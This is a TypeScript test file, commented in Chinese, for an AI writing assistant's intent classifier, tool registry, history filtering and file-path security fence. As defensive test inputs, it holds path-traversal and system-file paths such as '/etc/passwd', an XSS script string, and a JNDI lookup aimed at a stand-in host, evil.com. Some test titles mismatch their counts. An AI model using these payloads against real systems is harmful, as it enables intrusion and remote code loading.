/**
 * AI 写作助手全面功能测试 (V9.5.2)
 *
 * 不调真实 API，验证所有代码路径、边界条件、错误处理。
 * 覆盖：意图分类/工具裁剪/Domain模块/displayOnly/安全围栏/缓存/上传
 */

import { describe, it, expect, beforeAll } from 'vitest'
import { V4SecurityFence } from '../V4SecurityFence'
import { selectDomainModules, AI_CAPABILITIES_MODULE, SOFTWARE_FEATURES_MODULE } from '../V4SystemPrompt'
import { toolRegistry } from '../skills/ToolRegistry'
import { ALL_TOOLS } from '../skills/tools'

beforeAll(() => {
  toolRegistry.registerAll(ALL_TOOLS)
})

// ── displayOnly 检测（与 AIChatWindow 中间件逻辑一致） ──
const DISPLAY_ONLY_PATTERN = /你能做什么|你会什么|你有什么能力|AI助手能做什么|AI能做什么|软件有什么功能|软件说明|功能介绍|软件能做什么|这个软件是什么|软件功能/
function isDisplayOnlyQuery(msg: string): boolean {
  return DISPLAY_ONLY_PATTERN.test(msg)
}

// ── buildHistoryMessages 过滤逻辑 ──
function buildHistoryMessages(msgs: Array<{ id: string; role: string; content: string; displayOnly?: boolean; compressedSummary?: boolean; tool_calls?: any[] }>) {
  return msgs
    .filter(m =>
      (m.role === 'user' || m.role === 'assistant')
      && m.id !== 'welcome'
      && !m.compressedSummary
      && !m.displayOnly
    )
    .map(m => ({ role: m.role, content: m.content }))
}

// ── 意图分类（与 IntentClassifier 逻辑一致） ──
function classifyIntent(msg: string): 'chat' | 'simple' | 'complex' {
  if (/^(你好|谢谢|再见|嗯|好的|OK|ok)/.test(msg)) return 'chat'
  if (/写|创建|修改|删除|编辑|生成|续写|仿写|改写|替换/.test(msg) &&
    (msg.match(/[，,；;。\n]/g) || []).length >= 2) return 'complex'
  if (/写|创建|生成|续写|仿写|改写/.test(msg)) return 'complex'
  if (/查看|检查|列出|读取|看看|搜索/.test(msg)) return 'simple'
  return 'chat'
}

// ── 任务画像匹配 ──
function matchTaskProfile(msg: string): string {
  if (/风格|文风|仿写|分析.*文/.test(msg)) return 'style'
  if (/场景.*(?:模板|创建|生成)|创建.*场景/.test(msg)) return 'scene'
  if (/创建.*角色|添加.*角色|角色.*创建/.test(msg)) return 'character'
  if (/写.{0,5}章|创作|生成.{0,5}章|续写/.test(msg)) return 'chapter'
  if (/知识库|kb|素材.*保存/.test(msg)) return 'kb'
  if (/图片|插图|配图|生成.*图|画.*图/.test(msg)) return 'image'
  if (/查看|检查|列出|读取|看看|搜索/.test(msg)) return 'read'
  return 'default'
}

describe('AI 写作助手 — 全面功能测试', () => {

  // ══════════════════════════════════════════════════════════════
  // 1. 意图分类
  // ══════════════════════════════════════════════════════════════

  describe('意图分类', () => {
    it('复杂任务 → complex', () => {
      expect(classifyIntent('帮我完善世界观，创建5个角色，写前3章细纲')).toBe('complex')
      expect(classifyIntent('修改第3章的结尾，把张三改成李四，然后调整节奏')).toBe('complex')
      expect(classifyIntent('续写第5章，保持跟前面一样的风格')).toBe('complex')
    })

    it('简单查看 → simple', () => {
      expect(classifyIntent('看看角色列表')).toBe('simple')
      expect(classifyIntent('查看大纲')).toBe('simple')
      expect(classifyIntent('读取当前章节内容')).toBe('simple')
    })

    it('闲聊 → chat', () => {
      expect(classifyIntent('你好')).toBe('chat')
      expect(classifyIntent('谢谢')).toBe('chat')
      expect(classifyIntent('好的没问题')).toBe('chat')
    })

    it('单写操作 → complex（即使是单个写操作）', () => {
      expect(classifyIntent('写第一章')).toBe('complex')
      expect(classifyIntent('创建新角色')).toBe('complex')
      expect(classifyIntent('生成细纲')).toBe('complex')
    })
  })

  // ══════════════════════════════════════════════════════════════
  // 2. 工具裁剪
  // ══════════════════════════════════════════════════════════════

  describe('工具裁剪（按 task profile）', () => {
    it('39 个工具全部注册', () => {
      expect(toolRegistry.count()).toBe(41)
    })

    it('风格核心工具存在', () => {
      expect(toolRegistry.has('read_file')).toBe(true)
      expect(toolRegistry.has('create_style_template')).toBe(true)
      expect(toolRegistry.has('create_scene_template')).toBe(true)
    })

    it('章节核心工具存在', () => {
      for (const t of ['read_file', 'list_directory', 'search_content', 'create_file', 'edit_file']) {
        expect(toolRegistry.has(t)).toBe(true)
      }
    })

    it('只读工具存在', () => {
      for (const t of ['read_file', 'list_directory', 'search_content']) {
        expect(toolRegistry.has(t)).toBe(true)
      }
    })

    it('图片工具存在', () => {
      expect(toolRegistry.has('search_images')).toBe(true)
      expect(toolRegistry.has('generate_image')).toBe(true)
    })
  })

  // ══════════════════════════════════════════════════════════════
  // 3. Domain 模块选择
  // ══════════════════════════════════════════════════════════════

  describe('Domain 模块', () => {
    it('AI 能力问题 → AI_CAPABILITIES_MODULE', () => {
      const modules = selectDomainModules('你能做什么')
      expect(modules).toContain(AI_CAPABILITIES_MODULE)
    })

    it('软件功能问题 → SOFTWARE_FEATURES_MODULE', () => {
      const modules = selectDomainModules('软件有什么功能')
      expect(modules).toContain(SOFTWARE_FEATURES_MODULE)
    })

    it('AI 能力问题不触发软件功能模块', () => {
      const modules = selectDomainModules('你会什么')
      expect(modules).toContain(AI_CAPABILITIES_MODULE)
      expect(modules).not.toContain(SOFTWARE_FEATURES_MODULE)
    })

    it('普通创作问题不触发能力/功能模块', () => {
      const modules = selectDomainModules('帮我写第一章')
      expect(modules).not.toContain(AI_CAPABILITIES_MODULE)
      expect(modules).not.toContain(SOFTWARE_FEATURES_MODULE)
    })
  })

  // ══════════════════════════════════════════════════════════════
  // 4. displayOnly 机制
  // ══════════════════════════════════════════════════════════════

  describe('displayOnly — 不入上下文', () => {
    it('10个关键词全部命中', () => {
      const keywords = [
        '你能做什么', '你会什么', '你有什么能力',
        'AI助手能做什么', 'AI能做什么',
        '软件有什么功能', '软件说明', '功能介绍',
        '软件能做什么', '这个软件是什么', '软件功能',
      ]
      for (const kw of keywords) {
        expect(isDisplayOnlyQuery(kw)).toBe(true)
      }
    })

    it('普通消息不命中', () => {
      expect(isDisplayOnlyQuery('帮我写第一章')).toBe(false)
      expect(isDisplayOnlyQuery('查看大纲')).toBe(false)
      expect(isDisplayOnlyQuery('你好')).toBe(false)
    })

    it('displayOnly 消息在 buildHistoryMessages 中被过滤', () => {
      const msgs = [
        { id: '1', role: 'user', content: '软件有什么功能', displayOnly: true },
        { id: '2', role: 'assistant', content: '青剑是 AI 写作助手...', displayOnly: true },
        { id: '3', role: 'user', content: '帮我写第一章' },
        { id: '4', role: 'assistant', content: '好的，开始写第一章...' },
      ]
      const history = buildHistoryMessages(msgs as any)
      expect(history).toHaveLength(2)
      expect(history[0].content).toBe('帮我写第一章')
      expect(history[1].content).toBe('好的，开始写第一章...')
    })

    it('welcome 消息始终被过滤', () => {
      const msgs = [
        { id: 'welcome', role: 'assistant', content: '欢迎消息' },
        { id: '1', role: 'user', content: '你好' },
      ]
      const history = buildHistoryMessages(msgs as any)
      expect(history).toHaveLength(1)
      expect(history[0].content).toBe('你好')
    })

    it('compressedSummary 消息被过滤', () => {
      const msgs = [
        { id: '1', role: 'user', content: '真实消息' },
        { id: '2', role: 'assistant', content: '压缩摘要', compressedSummary: true },
      ]
      const history = buildHistoryMessages(msgs as any)
      expect(history).toHaveLength(1)
    })
  })

  // ══════════════════════════════════════════════════════════════
  // 5. 安全围栏
  // ══════════════════════════════════════════════════════════════

  describe('安全围栏', () => {
    const fence = new V4SecurityFence('test-project')

    it('正常路径 → 允许', () => {
      expect(fence.check('read_file', { file_path: 'outline/plot.md' }).allowed).toBe(true)
      expect(fence.check('create_file', { file_path: 'chapters/ch001.txt' }).allowed).toBe(true)
    })

    it('系统路径 → 硬拦截', () => {
      expect(fence.check('read_file', { file_path: 'C:/Windows/test.txt' }).allowed).toBe(false)
      expect(fence.check('read_file', { file_path: '/etc/passwd' }).allowed).toBe(false)
    })

    it('外部路径 → 需审批', () => {
      // Deep traversal → external → needs approval
      const r1 = fence.check('read_file', { file_path: '../../../etc/passwd' })
      expect(r1.allowed).toBe(true)
      expect(r1.needsApproval).toBe(true)
      // Absolute user path → external → needs approval
      const r2 = fence.check('read_file', { file_path: 'C:/Users/test/file.txt' })
      expect(r2.allowed).toBe(true)
      expect(r2.needsApproval).toBe(true)
    })

    it('内部路径 → 无需审批', () => {
      // Shallow ../ → app-internal (style_templates etc.)
      const r1 = fence.check('read_file', { file_path: '../../style_templates/x.json' })
      expect(r1.allowed).toBe(true)
      expect(r1.needsApproval).toBe(false)
      // Regular project path
      const r2 = fence.check('read_file', { file_path: 'chapters/ch1.txt' })
      expect(r2.allowed).toBe(true)
      expect(r2.needsApproval).toBe(false)
    })

    it('危险工具 → DANGEROUS_ASK 权限', () => {
      const deleteTool = toolRegistry.get('delete_file')
      expect(deleteTool?.permission).toBe('DANGEROUS_ASK')

      const createTool = toolRegistry.get('create_file')
      expect(createTool?.permission).toBe('AUTO')
    })

    it('只读工具 → AUTO 权限', () => {
      const readTool = toolRegistry.get('read_file')
      expect(readTool?.permission).toBe('AUTO')

    })
  })

  // ══════════════════════════════════════════════════════════════
  // 6. 工具完整性
  // ══════════════════════════════════════════════════════════════

  describe('工具完整性', () => {
    it('39 个工具全部注册', () => {
      const schemas = toolRegistry.getAllSchemas()
      expect(schemas).toHaveLength(41)
    })

    it('8 个文件工具', () => {
      const fileTools = ['list_directory', 'read_file', 'search_content',
        'edit_file', 'create_file', 'delete_file', 'rename_file']
      for (const t of fileTools) {
        expect(toolRegistry.has(t)).toBe(true)
      }
    })

    it('所有工具 name 唯一', () => {
      const names = toolRegistry.getNames()
      expect(new Set(names).size).toBe(names.length)
    })

    it('所有工具都有 category', () => {
      const allTools = toolRegistry.getAllDefinitions()
      expect(allTools.length).toBeGreaterThan(0)
      for (const t of allTools) {
        expect(t.category).toBeDefined()
        expect(t.category.length).toBeGreaterThan(0)
      }
    })

    it('所有工具都有 permission 级别', () => {
      const allTools = toolRegistry.getAllDefinitions()
      expect(allTools.length).toBeGreaterThan(0)
      const validPermissions = ['AUTO', 'READ_ASK', 'PROJECT_ASK', 'DANGEROUS_ASK']
      for (const t of allTools) {
        expect(validPermissions).toContain(t.permission)
      }
    })
  })

  // ══════════════════════════════════════════════════════════════
  // 7. 任务画像匹配
  // ══════════════════════════════════════════════════════════════

  describe('任务画像匹配', () => {
    it('风格任务', () => {
      expect(matchTaskProfile('上传文件分析风格生成模板')).toBe('style')
      expect(matchTaskProfile('帮我分析这段文的文风')).toBe('style')
    })
    it('场景任务', () => {
      expect(matchTaskProfile('创建场景模板')).toBe('scene')
    })
    it('角色任务', () => {
      expect(matchTaskProfile('创建一个反派角色')).toBe('character')
    })
    it('章节任务', () => {
      expect(matchTaskProfile('写第3章')).toBe('chapter')
      expect(matchTaskProfile('续写故事')).toBe('chapter')
    })
    it('图片任务', () => {
      expect(matchTaskProfile('生成一张古风图')).toBe('image')
      expect(matchTaskProfile('帮我找一张插图')).toBe('image')
    })
    it('查看任务', () => {
      expect(matchTaskProfile('看看大纲')).toBe('read')
    })
    it('未知任务 → default', () => {
      expect(matchTaskProfile('你好')).toBe('default')
    })
  })

  // ══════════════════════════════════════════════════════════════
  // 8. 边界条件
  // ══════════════════════════════════════════════════════════════

  describe('边界条件', () => {
    it('空消息 → chat', () => {
      expect(classifyIntent('')).toBe('chat')
    })

    it('超长消息不崩溃', () => {
      const long = '写'.repeat(10000)
      expect(() => classifyIntent(long)).not.toThrow()
    })

    it('特殊字符消息不崩溃', () => {
      expect(() => classifyIntent('<script>alert("xss")</script>')).not.toThrow()
      expect(() => isDisplayOnlyQuery('${jndi:ldap://evil.com}')).not.toThrow()
    })

    it('所有工具 executor 都是函数', () => {
      const allTools = toolRegistry.getAllDefinitions()
      expect(allTools.length).toBeGreaterThan(0)
      for (const t of allTools) {
        expect(typeof t.executor).toBe('function')
      }
    })

    it('buildHistoryMessages 过滤 tool 角色和空 tool_calls 消息', () => {
      const msgs = [
        { id: '1', role: 'user', content: '写第一章' },
        { id: '2', role: 'tool', content: 'file content...', tool_call_id: 't1' },
        { id: '3', role: 'assistant', content: '已完成' },
      ]
      const history = buildHistoryMessages(msgs as any)
      // tool 角色消息被过滤，只保留 user 和 assistant
      expect(history).toHaveLength(2)
      expect(history[0].role).toBe('user')
      expect(history[1].role).toBe('assistant')
      expect(history[1].content).toBe('已完成')
    })
  })
})
